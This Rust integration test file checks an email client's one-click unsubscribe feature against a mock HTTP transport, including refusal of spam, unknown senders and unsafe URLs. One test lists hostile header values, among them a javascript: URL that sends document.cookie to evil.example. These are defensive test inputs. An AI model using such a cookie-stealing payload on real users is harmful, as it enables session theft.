//! In-app unsubscribe, end to end through the command layer.
//!
//! No network: the one-click `POST` goes to a scripted `HttpTransport`, and
//! nothing here can reach a real sender. The unit tests in `unsub::target`,
//! `unsub::rule` and `unsub::run` pin the parsing, the judgement and the
//! request shape; these pin the things that only exist once the pieces are
//! wired together.
//!
//! The load-bearing ones:
//!
//!  * `the_rule_is_re_run_here_not_trusted_from_the_caller` — a caller who asks
//!    to unsubscribe from something the rule refuses gets nothing sent. This is
//!    the whole protection against an agent, or a stale UI, confirming his
//!    address to a spammer.
//!  * `a_refusal_from_the_sender_is_reported_rather_than_swallowed`.
//!  * `nothing_is_sent_for_a_javascript_url`.

use std::sync::{Arc, Mutex};

use mach_lib::commands::{AccountClients, Command, CommandDispatcher};
use mach_lib::db::models::{NewAccount, NewMessage, NewThread, Participant};
use mach_lib::db::{queries, sync_queries, Db};
use mach_lib::google::{
    BoxFuture, HttpRequest, HttpResponse, HttpTransport, RetryPolicy, StaticTokenProvider,
    TransportError,
};
use mach_lib::unsub;

// ============================================================== test doubles

/// Answers every request with one status and remembers what it was asked.
struct Sender {
    status: u16,
    requests: Mutex<Vec<HttpRequest>>,
}

impl Sender {
    fn answering(status: u16) -> Arc<Self> {
        Arc::new(Sender {
            status,
            requests: Mutex::new(Vec::new()),
        })
    }
    fn requests(&self) -> Vec<HttpRequest> {
        self.requests.lock().unwrap().clone()
    }
}

impl HttpTransport for Sender {
    fn execute<'a>(
        &'a self,
        request: HttpRequest,
    ) -> BoxFuture<'a, Result<HttpResponse, TransportError>> {
        self.requests.lock().unwrap().push(request);
        let status = self.status;
        Box::pin(async move { Ok(HttpResponse::json(status, "{}")) })
    }
}

// ================================================================== fixtures

/// The account's own Gmail transport. Separate from the unsubscribe one, so a
/// test can tell which of the two a request went to.
struct Google;
impl HttpTransport for Google {
    fn execute<'a>(
        &'a self,
        _request: HttpRequest,
    ) -> BoxFuture<'a, Result<HttpResponse, TransportError>> {
        Box::pin(async { Ok(HttpResponse::json(200, "{}")) })
    }
}

fn dispatcher(db: &Db, unsub_http: Arc<dyn HttpTransport>) -> CommandDispatcher {
    let clients = AccountClients::new(Arc::new(Google))
        .with_gmail_base_url("https://gmail.test/gmail/v1")
        .with_retry_policy(RetryPolicy::none())
        .with_account(1, Arc::new(StaticTokenProvider::new("token-1")));
    CommandDispatcher::new(db.clone(), Arc::new(clients))
        .expect("dispatcher")
        .with_unsub_http(unsub_http)
}

/// One newsletter, of the shape a real one has: Gmail filed it under Promotions,
/// it carries a `List-Id`, and the store already holds several from the sender.
///
/// Returns the message id of the newest one.
fn seed_newsletter(db: &Db, headers: Headers) -> i64 {
    // Message labels live in a table the sync engine creates at boot rather
    // than a migration, and these tests build a dispatcher without one.
    db.write(sync_queries::ensure_schema).unwrap();
    let account_id = db
        .write(|c| {
            queries::upsert_account(
                c,
                &NewAccount {
                    email: "bruno@example.com".into(),
                    display_name: None,
                    token_ref: String::new(),
                    colour_index: 0,
                },
            )
        })
        .unwrap();

    db.write(|c| {
        let thread_id = queries::upsert_thread(
            c,
            &NewThread {
                account_id,
                gmail_thread_id: "t-news".into(),
                participants: vec![Participant::new("hello@stratechery.com")],
                subject: "Daily Update".into(),
                snippet: "snippet".into(),
                last_message_at: 1_700_000_000_000,
                is_unread: true,
                message_count: 1,
                has_attachments: false,
                label_ids: vec!["INBOX".into(), "CATEGORY_PROMOTIONS".into()],
            },
        )?;

        // Three older issues, so the sender is established. They carry no
        // headers; only the count matters.
        for i in 0..3 {
            queries::upsert_message(
                c,
                &NewMessage {
                    thread_id,
                    account_id,
                    gmail_message_id: format!("old-{i}"),
                    from: Participant::new("hello@stratechery.com"),
                    subject: "Older issue".into(),
                    internal_date: 1_699_000_000_000 + i,
                    ..Default::default()
                },
            )?;
        }

        let message_id = queries::upsert_message(
            c,
            &NewMessage {
                thread_id,
                account_id,
                gmail_message_id: "m-news".into(),
                from: Participant::new("hello@stratechery.com"),
                subject: "Daily Update".into(),
                internal_date: 1_700_000_000_000,
                is_unread: true,
                list_unsubscribe: headers.list_unsubscribe.map(str::to_string),
                list_unsubscribe_post: headers.list_unsubscribe_post.map(str::to_string),
                list_id: headers.list_id.map(str::to_string),
                precedence: None,
                ..Default::default()
            },
        )?;
        sync_queries::set_message_labels(
            c,
            account_id,
            "m-news",
            &headers
                .labels
                .iter()
                .map(|s| s.to_string())
                .collect::<Vec<_>>(),
        )?;
        Ok(message_id)
    })
    .unwrap()
}

struct Headers {
    list_unsubscribe: Option<&'static str>,
    list_unsubscribe_post: Option<&'static str>,
    list_id: Option<&'static str>,
    labels: &'static [&'static str],
}

impl Default for Headers {
    fn default() -> Self {
        Headers {
            list_unsubscribe: Some("<https://stratechery.com/u/9f2a>"),
            list_unsubscribe_post: Some("List-Unsubscribe=One-Click"),
            list_id: Some("<daily.stratechery.com>"),
            labels: &["INBOX", "CATEGORY_PROMOTIONS", "UNREAD"],
        }
    }
}

// ===================================================================== tests

#[tokio::test]
async fn a_one_click_newsletter_is_unsubscribed_with_one_post() {
    let db = Db::open_in_memory().unwrap();
    let message_id = seed_newsletter(&db, Headers::default());
    let http = Sender::answering(200);
    let d = dispatcher(&db, http.clone());

    let result = d
        .execute(Command::Unsubscribe { message_id })
        .await
        .unwrap();

    assert!(result.ok, "{}", result.message);
    assert_eq!(result.undo, None, "an unsubscribe cannot be taken back");

    let requests = http.requests();
    assert_eq!(requests.len(), 1, "exactly one request");
    assert_eq!(requests[0].url, "https://stratechery.com/u/9f2a");
    assert_eq!(
        requests[0].body.as_deref(),
        Some(b"List-Unsubscribe=One-Click".as_slice())
    );
}

#[tokio::test]
async fn the_rule_is_re_run_here_not_trusted_from_the_caller() {
    // A message with a perfect one-click header from a sender the store has
    // never seen before. The frontend would not have offered this; the command
    // layer is asked anyway, which is what an agent — or a stale window —
    // could do.
    let db = Db::open_in_memory().unwrap();
    db.write(sync_queries::ensure_schema).unwrap();
    let account_id = db
        .write(|c| {
            queries::upsert_account(
                c,
                &NewAccount {
                    email: "bruno@example.com".into(),
                    display_name: None,
                    token_ref: String::new(),
                    colour_index: 0,
                },
            )
        })
        .unwrap();
    let message_id = db
        .write(|c| {
            let thread_id = queries::upsert_thread(
                c,
                &NewThread {
                    account_id,
                    gmail_thread_id: "t-blast".into(),
                    participants: vec![Participant::new("offers@bargains.example")],
                    subject: "You have won".into(),
                    snippet: "".into(),
                    last_message_at: 1,
                    is_unread: true,
                    message_count: 1,
                    has_attachments: false,
                    label_ids: vec!["INBOX".into()],
                },
            )?;
            let id = queries::upsert_message(
                c,
                &NewMessage {
                    thread_id,
                    account_id,
                    gmail_message_id: "m-blast".into(),
                    from: Participant::new("offers@bargains.example"),
                    subject: "You have won".into(),
                    internal_date: 1,
                    list_unsubscribe: Some("<https://bargains.example/u/1>".into()),
                    list_unsubscribe_post: Some("List-Unsubscribe=One-Click".into()),
                    list_id: Some("<offers.bargains.example>".into()),
                    ..Default::default()
                },
            )?;
            sync_queries::set_message_labels(c, account_id, "m-blast", &["INBOX".to_string()])?;
            Ok(id)
        })
        .unwrap();

    let http = Sender::answering(200);
    let d = dispatcher(&db, http.clone());
    let result = d
        .execute(Command::Unsubscribe { message_id })
        .await
        .unwrap();

    assert!(!result.ok);
    assert!(
        result.message.contains("spam"),
        "the honest offer is the spam report: {}",
        result.message
    );
    assert!(
        http.requests().is_empty(),
        "nothing may go to a sender the rule refused"
    );
}

#[tokio::test]
async fn mail_already_in_spam_is_never_confirmed_to_its_sender() {
    let db = Db::open_in_memory().unwrap();
    let message_id = seed_newsletter(
        &db,
        Headers {
            labels: &["SPAM"],
            ..Default::default()
        },
    );
    let http = Sender::answering(200);
    let d = dispatcher(&db, http.clone());

    let result = d
        .execute(Command::Unsubscribe { message_id })
        .await
        .unwrap();

    assert!(!result.ok);
    assert!(http.requests().is_empty());
}

#[tokio::test]
async fn nothing_is_sent_for_a_javascript_url() {
    for header in [
        "<javascript:fetch('https://evil.example/'+document.cookie)>",
        "<data:text/html,<script>1</script>>",
        "<http://plain.example/u/1>",
        "<https://127.0.0.1:1420/u>",
    ] {
        let db = Db::open_in_memory().unwrap();
        let message_id = seed_newsletter(
            &db,
            Headers {
                list_unsubscribe: Some(Box::leak(header.to_string().into_boxed_str())),
                ..Default::default()
            },
        );
        let http = Sender::answering(200);
        let d = dispatcher(&db, http.clone());

        let result = d
            .execute(Command::Unsubscribe { message_id })
            .await
            .unwrap();

        assert!(!result.ok, "{header} must be refused");
        assert!(http.requests().is_empty(), "{header} must send nothing");
    }
}

#[tokio::test]
async fn a_refusal_from_the_sender_is_reported_rather_than_swallowed() {
    let db = Db::open_in_memory().unwrap();
    let message_id = seed_newsletter(&db, Headers::default());
    let http = Sender::answering(500);
    let d = dispatcher(&db, http.clone());

    let result = d
        .execute(Command::Unsubscribe { message_id })
        .await
        .unwrap();

    assert!(!result.ok, "a 500 is not a success");
    assert!(result.message.contains("500"), "{}", result.message);
    assert_eq!(result.applied, Vec::<i64>::new());
    assert_eq!(result.failed.len(), 1);
    assert!(result.failed[0].retriable);
    assert!(
        !result.failed[0].rolled_back,
        "nothing was written locally, so nothing was put back"
    );
    assert_eq!(http.requests().len(), 1);
}

#[tokio::test]
async fn a_sender_offering_only_a_page_is_not_acted_on() {
    let db = Db::open_in_memory().unwrap();
    let message_id = seed_newsletter(
        &db,
        Headers {
            // https, but no `List-Unsubscribe-Post`: this is the case Mach does
            // not automate.
            list_unsubscribe_post: None,
            ..Default::default()
        },
    );
    let http = Sender::answering(200);
    let d = dispatcher(&db, http.clone());

    let result = d
        .execute(Command::Unsubscribe { message_id })
        .await
        .unwrap();

    assert!(!result.ok);
    assert!(http.requests().is_empty(), "no GET is made on a guess");
}

#[tokio::test]
async fn an_unknown_message_is_an_error_rather_than_a_refusal() {
    let db = Db::open_in_memory().unwrap();
    let http = Sender::answering(200);
    let d = dispatcher(&db, http.clone());
    assert!(d
        .execute(Command::Unsubscribe { message_id: 9999 })
        .await
        .is_err());
}

// -------------------------------------------------------- what the UI is told

#[test]
fn the_offer_the_frontend_receives_carries_no_url() {
    let db = Db::open_in_memory().unwrap();
    let message_id = seed_newsletter(&db, Headers::default());

    let offers = db
        .read(|c| unsub::store::offers_for_thread(c, 1))
        .unwrap();
    let (id, verdict) = offers.into_iter().next().expect("one offer");
    assert_eq!(id, message_id);

    let offer = unsub::Offer::from_verdict(&verdict).expect("an offer");
    let json = serde_json::to_string(&offer).unwrap();
    assert_eq!(json, r#"{"offer":"unsubscribe","method":"oneClick"}"#);
    assert!(
        !json.contains("stratechery.com"),
        "the URL must never cross into the webview: {json}"
    );
}

#[test]
fn a_sender_with_nothing_vouching_for_them_is_offered_the_spam_report() {
    let db = Db::open_in_memory().unwrap();
    db.write(sync_queries::ensure_schema).unwrap();
    // One message only, so `messages_from_sender` never reaches the threshold.
    let account_id = db
        .write(|c| {
            queries::upsert_account(
                c,
                &NewAccount {
                    email: "bruno@example.com".into(),
                    display_name: None,
                    token_ref: String::new(),
                    colour_index: 0,
                },
            )
        })
        .unwrap();
    db.write(|c| {
        let thread_id = queries::upsert_thread(
            c,
            &NewThread {
                account_id,
                gmail_thread_id: "t-one".into(),
                participants: vec![Participant::new("offers@bargains.example")],
                subject: "Offer".into(),
                snippet: "".into(),
                last_message_at: 1,
                is_unread: true,
                message_count: 1,
                has_attachments: false,
                label_ids: vec!["INBOX".into()],
            },
        )?;
        queries::upsert_message(
            c,
            &NewMessage {
                thread_id,
                account_id,
                gmail_message_id: "m-one".into(),
                from: Participant::new("offers@bargains.example"),
                subject: "Offer".into(),
                internal_date: 1,
                list_unsubscribe: Some("<https://bargains.example/u/1>".into()),
                list_id: Some("<offers.bargains.example>".into()),
                ..Default::default()
            },
        )?;
        sync_queries::set_message_labels(c, account_id, "m-one", &["INBOX".to_string()])
    })
    .unwrap();

    let offers = db
        .read(|c| unsub::store::offers_for_thread(c, 1))
        .unwrap();
    let (_, verdict) = offers.into_iter().next().expect("one verdict");
    let offer = unsub::Offer::from_verdict(&verdict).expect("an offer");
    assert_eq!(
        serde_json::to_string(&offer).unwrap(),
        r#"{"offer":"reportSpam","reason":"unknownSender"}"#
    );
}

#[test]
fn a_sender_he_has_written_to_is_established_even_on_one_message() {
    let db = Db::open_in_memory().unwrap();
    db.write(sync_queries::ensure_schema).unwrap();
    let account_id = db
        .write(|c| {
            queries::upsert_account(
                c,
                &NewAccount {
                    email: "bruno@example.com".into(),
                    display_name: None,
                    token_ref: String::new(),
                    colour_index: 0,
                },
            )
        })
        .unwrap();
    db.write(|c| {
        // A message he sent to the list address.
        let sent_thread = queries::upsert_thread(
            c,
            &NewThread {
                account_id,
                gmail_thread_id: "t-sent".into(),
                participants: vec![],
                subject: "hello".into(),
                snippet: "".into(),
                last_message_at: 1,
                is_unread: false,
                message_count: 1,
                has_attachments: false,
                label_ids: vec!["SENT".into()],
            },
        )?;
        queries::upsert_message(
            c,
            &NewMessage {
                thread_id: sent_thread,
                account_id,
                gmail_message_id: "m-sent".into(),
                from: Participant::new("bruno@example.com"),
                to: vec![Participant::new("announce@lists.example.org")],
                subject: "hello".into(),
                internal_date: 1,
                ..Default::default()
            },
        )?;

        let thread_id = queries::upsert_thread(
            c,
            &NewThread {
                account_id,
                gmail_thread_id: "t-list".into(),
                participants: vec![Participant::new("announce@lists.example.org")],
                subject: "Announce".into(),
                snippet: "".into(),
                last_message_at: 2,
                is_unread: true,
                message_count: 1,
                has_attachments: false,
                label_ids: vec!["INBOX".into()],
            },
        )?;
        queries::upsert_message(
            c,
            &NewMessage {
                thread_id,
                account_id,
                gmail_message_id: "m-list".into(),
                from: Participant::new("announce@lists.example.org"),
                subject: "Announce".into(),
                internal_date: 2,
                list_unsubscribe: Some(
                    "<mailto:announce-leave@lists.example.org?subject=unsubscribe>".into(),
                ),
                list_id: Some("<announce.lists.example.org>".into()),
                ..Default::default()
            },
        )?;
        sync_queries::set_message_labels(c, account_id, "m-list", &["INBOX".to_string()])
    })
    .unwrap();

    let offers = db
        .read(|c| unsub::store::offers_for_thread(c, 2))
        .unwrap();
    let (_, verdict) = offers.into_iter().next().expect("one verdict");
    assert_eq!(
        verdict,
        unsub::Verdict::Unsubscribe(unsub::Target::Mail {
            to: vec!["announce-leave@lists.example.org".into()],
            subject: "unsubscribe".into(),
            body: None,
        })
    );
}
